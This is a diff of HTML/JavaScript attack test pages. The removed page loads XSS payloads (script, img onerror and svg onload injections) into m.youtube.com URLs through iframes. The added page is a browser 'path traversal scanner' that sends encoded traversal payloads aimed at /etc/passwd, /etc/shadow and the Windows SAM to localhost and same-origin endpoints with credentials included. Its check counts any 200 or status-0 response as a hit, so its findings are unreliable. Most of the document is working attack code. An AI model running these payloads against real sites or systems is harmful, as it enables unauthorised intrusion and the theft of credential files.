@@ -1,16 +1,217 @@
+<!-- automated_scanner.html -->
+<!DOCTYPE html>
 <html>
-<script>
-// Test various XSS vectors
-var vectors = [
-  "https://m.youtube.com/results?search_query=<script>alert(1)</script>",
-  "https://m.youtube.com/watch?v=test&param='\"><img src=x onerror=alert(document.domain)>",
-  "https://m.youtube.com/#<svg onload=alert(1)>"
-];
-
-vectors.forEach(function(url) {
-  var iframe = document.createElement('iframe');
-  iframe.src = url;
-  document.body.appendChild(iframe);
-});
-</script>
+<head>
+    <title>Automated Path Traversal Scanner</title>
+    <style>
+        body { font-family: monospace; padding: 20px; }
+        .scanning { color: blue; }
+        .vulnerable { color: red; font-weight: bold; }
+        .safe { color: green; }
+        .error { color: orange; }
+        pre { background: #f5f5f5; padding: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Automated Path Traversal Scanner</h1>
+    
+    <button onclick="startScan()">Start Comprehensive Scan</button>
+    <button onclick="stopScan()" style="background: #ffcccc;">Stop Scan</button>
+    
+    <div id="progress">Ready</div>
+    <div id="results"></div>
+    
+    <script>
+    let scanActive = false;
+    let scanResults = [];
+    
+    const traversalPayloads = [
+        // Basic traversal
+        '../../../../../../../../../../etc/passwd',
+        '../../../../../../../../../../etc/shadow',
+        '../../../../../../../../../../windows/system32/config/SAM',
+        
+        // Encoded
+        '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
+        '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5cconfig%5cSAM',
+        
+        // Double encoded
+        '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
+        
+        // UTF-8 tricks
+        '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
+        
+        // Null bytes
+        '../../../../etc/passwd%00',
+        '../../../../etc/passwd%00.jpg',
+        
+        // Multiple slashes
+        '///////etc/passwd',
+        '\\\\\\\\\\\\\\windows\\system32\\config\\SAM',
+        
+        // Mixed
+        '..\\/..\\/etc/passwd',
+        '../..\\../etc/passwd'
+    ];
+    
+    const testEndpoints = [
+        // File API endpoints
+        'blob:',
+        'filesystem:',
+        
+        // Current origin paths
+        window.location.origin + '/test/../',
+        window.location.origin + '/%2e%2e/',
+        
+        // Localhost variants
+        'http://localhost/',
+        'http://127.0.0.1/',
+        'http://[::1]/'
+    ];
+    
+    function log(message, type = 'info') {
+        const resultsDiv = document.getElementById('results');
+        const div = document.createElement('div');
+        div.className = type;
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        resultsDiv.appendChild(div);
+        console.log(`[${type}] ${message}`);
+    }
+    
+    async function testEndpoint(endpoint, payload) {
+        const testUrl = endpoint + payload;
+        
+        try {
+            // Try with fetch first
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            
+            const response = await fetch(testUrl, {
+                method: 'HEAD',
+                signal: controller.signal,
+                credentials: 'include'
+            });
+            
+            clearTimeout(timeoutId);
+            
+            if (response.ok) {
+                return { vulnerable: true, method: 'fetch', status: response.status };
+            }
+            
+        } catch (fetchError) {
+            // Fetch failed, try XMLHttpRequest
+            try {
+                return await new Promise((resolve) => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.timeout = 5000;
+                    
+                    xhr.onload = () => {
+                        if (xhr.status === 200 || xhr.status === 0) {
+                            resolve({ vulnerable: true, method: 'xhr', status: xhr.status });
+                        } else {
+                            resolve({ vulnerable: false, method: 'xhr', status: xhr.status });
+                        }
+                    };
+                    
+                    xhr.onerror = () => resolve({ vulnerable: false, method: 'xhr', error: 'network error' });
+                    xhr.ontimeout = () => resolve({ vulnerable: false, method: 'xhr', error: 'timeout' });
+                    
+                    xhr.open('GET', testUrl, true);
+                    xhr.send();
+                });
+                
+            } catch (xhrError) {
+                return { vulnerable: false, method: 'xhr', error: xhrError.message };
+            }
+        }
+        
+        return { vulnerable: false, method: 'none', error: 'all methods failed' };
+    }
+    
+    async function startScan() {
+        if (scanActive) return;
+        
+        scanActive = true;
+        scanResults = [];
+        const progressDiv = document.getElementById('progress');
+        const resultsDiv = document.getElementById('results');
+        resultsDiv.innerHTML = '';
+        
+        log('Starting comprehensive path traversal scan...', 'scanning');
+        
+        let testsCompleted = 0;
+        const totalTests = traversalPayloads.length * testEndpoints.length;
+        
+        for (const endpoint of testEndpoints) {
+            if (!scanActive) break;
+            
+            for (const payload of traversalPayloads) {
+                if (!scanActive) break;
+                
+                testsCompleted++;
+                progressDiv.textContent = `Progress: ${testsCompleted}/${totalTests} tests`;
+                
+                log(`Testing: ${endpoint} with payload: ${payload}`, 'scanning');
+                
+                const result = await testEndpoint(endpoint, payload);
+                
+                if (result.vulnerable) {
+                    const message = `🚨 <strong>VULNERABILITY FOUND</strong>: ${endpoint} with ${payload} (${result.method}, status: ${result.status})`;
+                    log(message, 'vulnerable');
+                    scanResults.push({
+                        endpoint,
+                        payload,
+                        method: result.method,
+                        status: result.status,
+                        timestamp: new Date().toISOString()
+                    });
+                } else {
+                    log(`Safe: ${endpoint} blocked payload: ${payload}`, 'safe');
+                }
+                
+                // Brief pause between tests
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+        }
+        
+        scanActive = false;
+        progressDiv.textContent = 'Scan complete!';
+        
+        // Generate report
+        if (scanResults.length > 0) {
+            log('<br><strong>=== VULNERABILITIES FOUND ===</strong>', 'vulnerable');
+            scanResults.forEach((result, i) => {
+                log(`${i+1}. Endpoint: ${result.endpoint}`, 'vulnerable');
+                log(`   Payload: ${result.payload}`, 'vulnerable');
+                log(`   Method: ${result.method}, Status: ${result.status}`, 'vulnerable');
+            });
+            
+            // Create downloadable report
+            const report = JSON.stringify(scanResults, null, 2);
+            const blob = new Blob([report], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            
+            const downloadLink = document.createElement('a');
+            downloadLink.href = url;
+            downloadLink.download = 'path_traversal_report.json';
+            downloadLink.textContent = 'Download Report';
+            resultsDiv.appendChild(downloadLink);
+            
+        } else {
+            log('<br><strong>=== NO VULNERABILITIES FOUND ===</strong>', 'safe');
+            log('All path traversal attempts were properly blocked.', 'safe');
+        }
+    }
+    
+    function stopScan() {
+        scanActive = false;
+        log('Scan stopped by user', 'error');
+    }
+    
+    // Auto-start scan on page load for testing
+    // window.addEventListener('load', () => {
+    //     setTimeout(startScan, 1000);
+    // });
+    </script>
+</body>
 </html>
